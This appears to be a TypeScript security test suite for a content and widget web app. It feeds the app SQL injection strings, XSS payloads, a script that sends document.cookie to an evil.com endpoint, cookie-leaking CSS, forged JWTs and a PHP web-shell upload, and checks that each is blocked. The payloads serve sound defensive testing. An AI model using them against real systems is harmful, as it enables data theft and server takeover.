import request from 'supertest';
import request from 'supertest';
import app from '../../index';
import { DatabaseService } from '../../services/database';
import { SupabaseAuthService } from '../../services/supabase-auth.service';
import { WidgetAuthService } from '../../services/widget-auth.service';

describe('Comprehensive Security Tests', () => {
  let db: DatabaseService;
  let authService: SupabaseAuthService;
  let widgetAuthService: WidgetAuthService;
  
  let testUserId: string;
  let testWebsiteId: string;
  let testWidgetId: string;
  let validToken: string;
  let validAPIKey: string;

  const testUser = {
    email: `security-test-${Date.now()}@example.com`,
    password: 'SecurePassword123!',
    firstName: 'Security',
    lastName: 'Tester',
  };

  beforeAll(async () => {
    db = DatabaseService.getInstance();
    authService = SupabaseAuthService.getInstance();
    widgetAuthService = WidgetAuthService.getInstance();

    // Create test user and data
    await setupTestData();
  });

  afterAll(async () => {
    // Clean up test data
    if (testUserId) {
      await db.query('DELETE FROM auth.users WHERE id = $1', [testUserId]);
    }
  });

  async function setupTestData() {
    // Create test user
    const userResult = await db.query(`
      INSERT INTO auth.users (email, encrypted_password, email_confirmed_at, created_at, updated_at)
      VALUES ($1, crypt($2, gen_salt('bf')), NOW(), NOW(), NOW())
      RETURNING id
    `, [testUser.email, testUser.password]);
    testUserId = userResult.rows[0].id;

    // Create test website
    const websiteResult = await db.query(`
      INSERT INTO websites (user_id, name, domain, is_verified)
      VALUES ($1, 'Security Test Site', 'security-test.example.com', true)
      RETURNING id
    `, [testUserId]);
    testWebsiteId = websiteResult.rows[0].id;

    // Create test widget
    const widgetResult = await db.query(`
      INSERT INTO widgets (website_id, title, type, is_published)
      VALUES ($1, 'Security Test Widget', 'content', true)
      RETURNING id
    `, [testWebsiteId]);
    testWidgetId = widgetResult.rows[0].id;

    // Get valid token
    const loginResponse = await request(app)
      .post('/api/auth/login')
      .send({
        email: testUser.email,
        password: testUser.password,
      });
    
    validToken = loginResponse.body.data?.access_token;

    // Generate valid API key
    const { key } = await widgetAuthService.generateAPIKey(testWidgetId, 'Security Test Key', ['read']);
    validAPIKey = key;
  }

  describe('Authentication Security Tests', () => {
    describe('SQL Injection Prevention', () => {
      it('should prevent SQL injection in login endpoint', async () => {
        const sqlInjectionPayloads = [
          "admin'; DROP TABLE users; --",
          "' OR '1'='1",
          "' UNION SELECT * FROM users --",
          "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
          "' OR 1=1 --",
          "admin'/**/OR/**/1=1--",
          "' OR 'x'='x",
        ];

        for (const payload of sqlInjectionPayloads) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: payload,
              password: 'password',
            });

          // Should not succeed with SQL injection
          expect(response.status).not.toBe(200);
          expect(response.body.success).not.toBe(true);
        }
      });

      it('should prevent SQL injection in user search', async () => {
        const response = await request(app)
          .get('/api/users/search')
          .query({ q: "'; DROP TABLE users; --" })
          .set('Authorization', `Bearer ${validToken}`);

        expect(response.status).not.toBe(500); // Should not cause server error
      });

      it('should prevent SQL injection in content queries', async () => {
        const sqlPayloads = [
          "'; DELETE FROM content; --",
          "' UNION SELECT password FROM users --",
          "' OR 1=1 --",
        ];

        for (const payload of sqlPayloads) {
          const response = await request(app)
            .get(`/api/websites/${testWebsiteId}/content`)
            .query({ search: payload })
            .set('Authorization', `Bearer ${validToken}`);

          expect(response.status).not.toBe(500);
          // Should not return sensitive data
          if (response.body.data) {
            const responseText = JSON.stringify(response.body);
            expect(responseText).not.toMatch(/password|secret|key/i);
          }
        }
      });
    });

    describe('XSS Prevention', () => {
      it('should sanitize XSS payloads in content creation', async () => {
        const xssPayloads = [
          '<script>alert("XSS")</script>',
          '<img src="x" onerror="alert(\'XSS\')">',
          '<svg onload="alert(1)">',
          'javascript:alert("XSS")',
          '<iframe src="javascript:alert(\'XSS\')"></iframe>',
          '<body onload="alert(\'XSS\')">',
          '<div onclick="alert(\'XSS\')">Click me</div>',
          '"><script>alert("XSS")</script>',
        ];

        for (const payload of xssPayloads) {
          const response = await request(app)
            .post(`/api/websites/${testWebsiteId}/content`)
            .set('Authorization', `Bearer ${validToken}`)
            .send({
              title: `XSS Test: ${payload}`,
              content: `Content with XSS: ${payload}`,
              excerpt: `Excerpt: ${payload}`,
              status: 'draft',
            });

          if (response.status === 201) {
            // Check that XSS was sanitized
            expect(response.body.data.title).not.toContain('<script>');
            expect(response.body.data.content).not.toContain('<script>');
            expect(response.body.data.excerpt).not.toContain('<script>');
          }
        }
      });

      it('should sanitize XSS in widget rendering', async () => {
        // Create content with XSS payload
        const xssContent = '<script>alert("XSS in widget")</script><p>Normal content</p>';
        
        await db.query(`
          INSERT INTO content (website_id, title, content, status, published_at)
          VALUES ($1, 'XSS Test Content', $2, 'published', NOW())
        `, [testWebsiteId, xssContent]);

        const response = await request(app)
          .get(`/api/widgets/public/${testWidgetId}/render`);

        expect(response.status).toBe(200);
        expect(response.body.data.html).not.toContain('<script>alert("XSS in widget")</script>');
        expect(response.body.data.html).toContain('Normal content');
      });

      it('should prevent XSS in user profile fields', async () => {
        const xssPayload = '<script>alert("Profile XSS")</script>';
        
        const response = await request(app)
          .put('/api/profile')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            firstName: xssPayload,
            lastName: 'Test',
            bio: `Bio with XSS: ${xssPayload}`,
          });

        if (response.status === 200) {
          expect(response.body.data.firstName).not.toContain('<script>');
          expect(response.body.data.bio).not.toContain('<script>');
        }
      });
    });

    describe('Authentication Bypass Prevention', () => {
      it('should prevent JWT token manipulation', async () => {
        const manipulatedTokens = [
          'Bearer invalid.token.here',
          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
          'Bearer null',
          'Bearer undefined',
          'Bearer admin',
          '',
        ];

        for (const token of manipulatedTokens) {
          const response = await request(app)
            .get('/api/auth/me')
            .set('Authorization', token);

          expect(response.status).toBe(401);
          expect(response.body.success).toBe(false);
        }
      });

      it('should prevent privilege escalation', async () => {
        // Try to access admin endpoints without admin privileges
        const adminEndpoints = [
          '/api/admin/users',
          '/api/admin/analytics',
          '/api/admin/system',
        ];

        for (const endpoint of adminEndpoints) {
          const response = await request(app)
            .get(endpoint)
            .set('Authorization', `Bearer ${validToken}`);

          expect([401, 403, 404]).toContain(response.status);
        }
      });

      it('should prevent accessing other users data', async () => {
        // Create another user
        const otherUserResult = await db.query(`
          INSERT INTO auth.users (email, encrypted_password, email_confirmed_at, created_at, updated_at)
          VALUES ('other-user@example.com', crypt('password', gen_salt('bf')), NOW(), NOW(), NOW())
          RETURNING id
        `);
        const otherUserId = otherUserResult.rows[0].id;

        // Create website for other user
        const otherWebsiteResult = await db.query(`
          INSERT INTO websites (user_id, name, domain)
          VALUES ($1, 'Other User Site', 'other.example.com')
          RETURNING id
        `, [otherUserId]);
        const otherWebsiteId = otherWebsiteResult.rows[0].id;

        // Try to access other user's website
        const response = await request(app)
          .get(`/api/websites/${otherWebsiteId}`)
          .set('Authorization', `Bearer ${validToken}`);

        expect([401, 403, 404]).toContain(response.status);

        // Cleanup
        await db.query('DELETE FROM websites WHERE id = $1', [otherWebsiteId]);
        await db.query('DELETE FROM auth.users WHERE id = $1', [otherUserId]);
      });
    });

    describe('Rate Limiting Tests', () => {
      it('should enforce rate limits on login attempts', async () => {
        const maxAttempts = 10;
        const responses = [];

        // Make rapid login attempts
        for (let i = 0; i < maxAttempts + 5; i++) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: 'nonexistent@example.com',
              password: 'wrongpassword',
            });
          
          responses.push(response.status);
        }

        // Should eventually get rate limited
        const rateLimitedResponses = responses.filter(status => status === 429);
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      });

      it('should enforce rate limits on API endpoints', async () => {
        const responses = [];
        const maxRequests = 20;

        for (let i = 0; i < maxRequests; i++) {
          const response = await request(app)
            .get('/api/auth/me')
            .set('Authorization', `Bearer ${validToken}`);
          
          responses.push(response.status);
        }

        // Check if rate limiting kicked in
        const rateLimitedResponses = responses.filter(status => status === 429);
        console.log(`Rate limiting test: ${rateLimitedResponses.length} out of ${maxRequests} requests were rate limited`);
      });

      it('should enforce rate limits on widget API keys', async () => {
        const responses = [];
        const maxRequests = 15;

        for (let i = 0; i < maxRequests; i++) {
          const response = await request(app)
            .get(`/api/widgets/public/${testWidgetId}/render`)
            .set('Authorization', `Bearer ${validAPIKey}`);
          
          responses.push(response.status);
        }

        // API key rate limiting might be more lenient
        const successfulResponses = responses.filter(status => status === 200);
        const rateLimitedResponses = responses.filter(status => status === 429);
        
        console.log(`API Key rate limiting: ${successfulResponses.length} successful, ${rateLimitedResponses.length} rate limited`);
      });
    });

    describe('CSRF Protection', () => {
      it('should require CSRF token for state-changing operations', async () => {
        // Test without CSRF token
        const response = await request(app)
          .post(`/api/websites/${testWebsiteId}/content`)
          .set('Authorization', `Bearer ${validToken}`)
          .set('Origin', 'https://malicious-site.com')
          .send({
            title: 'CSRF Test',
            content: 'This should be blocked',
            status: 'draft',
          });

        // Should either succeed (if CSRF is handled differently) or fail
        if (response.status === 403) {
          expect(response.body.message).toMatch(/csrf|forbidden/i);
        }
      });

      it('should validate Origin header', async () => {
        const maliciousOrigins = [
          'https://evil.com',
          'http://localhost:3000.evil.com',
          'https://storyslip.com.evil.com',
          'null',
        ];

        for (const origin of maliciousOrigins) {
          const response = await request(app)
            .post(`/api/websites/${testWebsiteId}/content`)
            .set('Authorization', `Bearer ${validToken}`)
            .set('Origin', origin)
            .send({
              title: 'Origin Test',
              content: 'Testing origin validation',
              status: 'draft',
            });

          // Should either block or allow based on CORS policy
          if (response.status === 403) {
            expect(response.body.message).toMatch(/origin|cors/i);
          }
        }
      });
    });

    describe('Input Validation Security', () => {
      it('should validate email formats strictly', async () => {
        const invalidEmails = [
          'not-an-email',
          '@domain.com',
          'user@',
          'user..user@domain.com',
          'user@domain',
          'user@.com',
          '<script>alert("xss")</script>@domain.com',
        ];

        for (const email of invalidEmails) {
          const response = await request(app)
            .post('/api/auth/register')
            .send({
              email,
              password: 'ValidPassword123!',
              firstName: 'Test',
              lastName: 'User',
            });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });

      it('should enforce password complexity', async () => {
        const weakPasswords = [
          '123456',
          'password',
          'qwerty',
          'abc123',
          '12345678',
          'password123',
          'admin',
          '',
        ];

        for (const password of weakPasswords) {
          const response = await request(app)
            .post('/api/auth/register')
            .send({
              email: `test-${Date.now()}@example.com`,
              password,
              firstName: 'Test',
              lastName: 'User',
            });

          expect(response.status).toBe(400);
          expect(response.body.message).toMatch(/password/i);
        }
      });

      it('should validate file upload types and sizes', async () => {
        // Test with malicious file types
        const maliciousFiles = [
          { name: 'malware.exe', type: 'application/x-executable' },
          { name: 'script.php', type: 'application/x-php' },
          { name: 'shell.sh', type: 'application/x-sh' },
          { name: 'virus.bat', type: 'application/x-bat' },
        ];

        for (const file of maliciousFiles) {
          const response = await request(app)
            .post(`/api/websites/${testWebsiteId}/media/upload`)
            .set('Authorization', `Bearer ${validToken}`)
            .attach('file', Buffer.from('malicious content'), {
              filename: file.name,
              contentType: file.type,
            });

          expect([400, 415]).toContain(response.status);
        }
      });
    });

    describe('Session Security', () => {
      it('should invalidate sessions on password change', async () => {
        // Change password
        const changeResponse = await request(app)
          .put('/api/auth/change-password')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            currentPassword: testUser.password,
            newPassword: 'NewSecurePassword123!',
          });

        if (changeResponse.status === 200) {
          // Old token should be invalid
          const testResponse = await request(app)
            .get('/api/auth/me')
            .set('Authorization', `Bearer ${validToken}`);

          expect(testResponse.status).toBe(401);
        }
      });

      it('should prevent session fixation', async () => {
        // Login and get session
        const login1 = await request(app)
          .post('/api/auth/login')
          .send({
            email: testUser.email,
            password: 'NewSecurePassword123!',
          });

        const token1 = login1.body.data?.access_token;

        // Login again and get new session
        const login2 = await request(app)
          .post('/api/auth/login')
          .send({
            email: testUser.email,
            password: 'NewSecurePassword123!',
          });

        const token2 = login2.body.data?.access_token;

        // Tokens should be different
        expect(token1).not.toBe(token2);
      });

      it('should enforce session timeout', async () => {
        // This test would require manipulating token expiration
        // For now, we'll just verify that tokens have expiration
        const response = await request(app)
          .get('/api/auth/me')
          .set('Authorization', `Bearer ${validToken}`);

        if (response.status === 401) {
          expect(response.body.message).toMatch(/expired|invalid/i);
        }
      });
    });
  });

  describe('API Security Tests', () => {
    describe('Authorization Tests', () => {
      it('should require authentication for protected endpoints', async () => {
        const protectedEndpoints = [
          { method: 'GET', path: '/api/auth/me' },
          { method: 'GET', path: `/api/websites/${testWebsiteId}` },
          { method: 'POST', path: `/api/websites/${testWebsiteId}/content` },
          { method: 'PUT', path: '/api/profile' },
          { method: 'DELETE', path: `/api/websites/${testWebsiteId}/content/123` },
        ];

        for (const endpoint of protectedEndpoints) {
          const response = await request(app)[endpoint.method.toLowerCase()](endpoint.path);
          expect(response.status).toBe(401);
        }
      });

      it('should validate API key permissions', async () => {
        // Test with read-only API key on write operation
        const response = await request(app)
          .post(`/api/widgets/${testWidgetId}/settings`)
          .set('Authorization', `Bearer ${validAPIKey}`)
          .send({
            theme: 'dark',
          });

        expect([401, 403]).toContain(response.status);
      });
    });

    describe('Data Exposure Prevention', () => {
      it('should not expose sensitive data in API responses', async () => {
        const response = await request(app)
          .get('/api/auth/me')
          .set('Authorization', `Bearer ${validToken}`);

        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          
          // Should not contain sensitive fields
          expect(responseText).not.toMatch(/password|encrypted_password|secret|private_key/i);
          expect(responseText).not.toMatch(/\$2[aby]\$\d+\$/); // bcrypt hashes
        }
      });

      it('should not expose internal system information', async () => {
        const response = await request(app)
          .get('/api/status');

        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          
          // Should not expose sensitive system info
          expect(responseText).not.toMatch(/database_url|secret_key|private/i);
          expect(responseText).not.toMatch(/postgres:\/\/|mysql:\/\//);
        }
      });
    });

    describe('HTTP Security Headers', () => {
      it('should include security headers', async () => {
        const response = await request(app)
          .get('/api/status');

        // Check for important security headers
        expect(response.headers['x-content-type-options']).toBe('nosniff');
        expect(response.headers['x-frame-options']).toBeDefined();
        expect(response.headers['x-xss-protection']).toBeDefined();
        
        // Should not expose server information
        expect(response.headers['server']).not.toMatch(/express|node/i);
      });

      it('should set proper CORS headers', async () => {
        const response = await request(app)
          .options('/api/auth/login')
          .set('Origin', 'https://storyslip.com');

        expect(response.headers['access-control-allow-origin']).toBeDefined();
        expect(response.headers['access-control-allow-methods']).toBeDefined();
        expect(response.headers['access-control-allow-headers']).toBeDefined();
      });
    });
  });

  describe('Widget Security Tests', () => {
    describe('Widget Injection Prevention', () => {
      it('should prevent malicious script injection in widgets', async () => {
        // Create content with malicious script
        const maliciousContent = `
          <script>
            // Malicious script
            fetch('https://evil.com/steal', {
              method: 'POST',
              body: JSON.stringify(document.cookie)
            });
          </script>
          <p>Normal content</p>
        `;

        await db.query(`
          INSERT INTO content (website_id, title, content, status, published_at)
          VALUES ($1, 'Malicious Content', $2, 'published', NOW())
        `, [testWebsiteId, maliciousContent]);

        const response = await request(app)
          .get(`/api/widgets/public/${testWidgetId}/render`);

        expect(response.status).toBe(200);
        expect(response.body.data.html).not.toContain('fetch(\'https://evil.com/steal\'');
        expect(response.body.data.html).not.toContain('<script>');
      });

      it('should prevent CSS injection attacks', async () => {
        const maliciousCSS = `
          body { display: none !important; }
          * { background: url('https://evil.com/track?data=' + document.cookie) !important; }
          @import url('https://evil.com/malicious.css');
        `;

        // Test widget with malicious CSS
        const response = await request(app)
          .get(`/api/widgets/public/${testWidgetId}/render`);

        if (response.status === 200) {
          expect(response.body.data.css).not.toContain('evil.com');
          expect(response.body.data.css).not.toContain('@import');
          expect(response.body.data.css).not.toContain('document.cookie');
        }
      });
    });

    describe('Widget Access Control', () => {
      it('should prevent unauthorized widget access', async () => {
        // Create unpublished widget
        const unpublishedResult = await db.query(`
          INSERT INTO widgets (website_id, title, type, is_published)
          VALUES ($1, 'Private Widget', 'content', false)
          RETURNING id
        `, [testWebsiteId]);
        const unpublishedWidgetId = unpublishedResult.rows[0].id;

        const response = await request(app)
          .get(`/api/widgets/public/${unpublishedWidgetId}/render`);

        expect(response.status).toBe(404);

        // Cleanup
        await db.query('DELETE FROM widgets WHERE id = $1', [unpublishedWidgetId]);
      });

      it('should validate widget domain restrictions', async () => {
        // This would test domain-based widget restrictions
        // Implementation depends on how domain restrictions are configured
        const response = await request(app)
          .get(`/api/widgets/public/${testWidgetId}/render`)
          .set('Referer', 'https://unauthorized-domain.com');

        // Should either allow or block based on domain configuration
        expect([200, 403]).toContain(response.status);
      });
    });
  });

  describe('Database Security Tests', () => {
    describe('Row Level Security', () => {
      it('should enforce RLS policies', async () => {
        // Test that users can only access their own data
        const response = await request(app)
          .get(`/api/websites`)
          .set('Authorization', `Bearer ${validToken}`);

        if (response.status === 200) {
          // Should only return websites owned by the authenticated user
          const websites = response.body.data;
          websites.forEach((website: any) => {
            expect(website.user_id).toBe(testUserId);
          });
        }
      });
    });

    describe('Data Integrity', () => {
      it('should prevent data corruption through API', async () => {
        const maliciousData = {
          title: 'A'.repeat(10000), // Extremely long title
          content: '<script>'.repeat(1000), // Repeated script tags
          status: 'invalid_status', // Invalid enum value
          user_id: 'different-user-id', // Attempt to change ownership
        };

        const response = await request(app)
          .post(`/api/websites/${testWebsiteId}/content`)
          .set('Authorization', `Bearer ${validToken}`)
          .send(maliciousData);

        expect([400, 422]).toContain(response.status);
      });
    });
  });

  describe('File Upload Security', () => {
    it('should prevent malicious file uploads', async () => {
      // Test various malicious file types
      const maliciousFiles = [
        { content: '<?php system($_GET["cmd"]); ?>', name: 'shell.php' },
        { content: '<script>alert("xss")</script>', name: 'xss.html' },
        { content: 'MZ\x90\x00', name: 'malware.exe' }, // PE header
        { content: '\x7fELF', name: 'linux-binary' }, // ELF header
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post(`/api/websites/${testWebsiteId}/media/upload`)
          .set('Authorization', `Bearer ${validToken}`)
          .attach('file', Buffer.from(file.content), file.name);

        expect([400, 415, 422]).toContain(response.status);
      }
    });

    it('should enforce file size limits', async () => {
      // Create a large file (simulate)
      const largeContent = 'A'.repeat(50 * 1024 * 1024); // 50MB

      const response = await request(app)
        .post(`/api/websites/${testWebsiteId}/media/upload`)
        .set('Authorization', `Bearer ${validToken}`)
        .attach('file', Buffer.from(largeContent), 'large-file.txt');

      expect([413, 422]).toContain(response.status);
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not expose stack traces in production', async () => {
      // Trigger an error
      const response = await request(app)
        .get('/api/nonexistent-endpoint');

      expect(response.status).toBe(404);
      
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toMatch(/at\s+\w+\s+\(/); // Stack trace pattern
      expect(responseText).not.toMatch(/Error:\s+/);
      expect(responseText).not.toMatch(/\/src\/|\/node_modules\//);
    });

    it('should not expose database errors', async () => {
      // Try to cause a database error
      const response = await request(app)
        .get(`/api/websites/invalid-uuid-format`)
        .set('Authorization', `Bearer ${validToken}`);

      expect([400, 404]).toContain(response.status);
      
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toMatch(/postgres|pg_|relation|column/i);
    });
  });

  describe('Timing Attack Prevention', () => {
    it('should have consistent response times for login attempts', async () => {
      const validEmail = testUser.email;
      const invalidEmail = 'nonexistent@example.com';
      const password = 'wrongpassword';

      // Measure response times
      const times: number[] = [];

      for (let i = 0; i < 5; i++) {
        const start = Date.now();
        await request(app)
          .post('/api/auth/login')
          .send({ email: validEmail, password });
        times.push(Date.now() - start);

        const start2 = Date.now();
        await request(app)
          .post('/api/auth/login')
          .send({ email: invalidEmail, password });
        times.push(Date.now() - start2);
      }

      // Response times should be relatively consistent
      const avgTime = times.reduce((a, b) => a + b) / times.length;
      const maxDeviation = Math.max(...times.map(t => Math.abs(t - avgTime)));
      
      // Allow for some variance but not too much
      expect(maxDeviation).toBeLessThan(avgTime * 2);
    });
  });
});